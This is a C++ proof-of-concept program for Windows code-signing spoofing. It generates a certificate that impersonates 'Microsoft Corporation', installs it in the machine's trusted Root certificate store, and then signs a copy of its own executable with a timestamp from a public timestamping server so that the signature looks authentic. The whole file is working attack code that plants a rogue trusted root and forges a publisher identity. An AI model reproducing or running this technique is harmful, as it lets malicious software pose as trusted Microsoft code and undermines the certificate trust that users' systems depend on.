#include <Core\CertContext.h>
#include <Core\CertStore.h>
#include <Core\CryptContext.h>
#include <Core\FileSigner.h>
#include <LibNeat\Neat\Win\Exception.h>

#include <exception>
#include <filesystem>
#include <iostream>

int wmain(int argc, const wchar_t* argv[])
{
	try
	{
		Neat::Win::StructuredException::EnableInThisThread();

		const auto containerName = L"PoC";
		const auto certSubject = LR"(C=US, S=Washington, L=Redmond, O="Microsoft Corporation", CN="Microsoft Corporation")";
		const auto friendlyName = L"Microsoft Corporation";
		const auto validMinutes = 1;
		const auto storeName = L"Root";
		const auto timeStampServer = L"http://timestamp.globalsign.com/scripts/timstamp.dll";

		std::cout << "Creating container..." << std::endl;
		CryptContext context(containerName);

		std::cout << "Generating key..." << std::endl;
		auto key = context.GenerateKey();

		std::cout << "Generating certificate..." << std::endl;
		auto cert = CertContext::Create(containerName, certSubject, friendlyName, validMinutes);

		std::cout << "Importing certificate..." << std::endl;
		auto store = CertStore::Open(storeName);
		store.Import(cert);

		std::cout << "Copying executable..." << std::endl;
		const auto originalPath = argv[0];
		std::experimental::filesystem::path path(originalPath);
		path.replace_extension(L"signed.exe");
		const auto targetPath = path.c_str();
		
		std::experimental::filesystem::copy_file(
			originalPath,
			targetPath,
			std::experimental::filesystem::copy_options::overwrite_existing);

		std::cout << "Signing executable..." << std::endl;
		FileSigner::Sign(targetPath, containerName, timeStampServer, cert);

		std::cout << "Success!" << std::endl;
	}
	catch (const std::exception& ex)
	{
		std::cout << "Error: " << ex.what() << std::endl;
	}
	return 0;
}

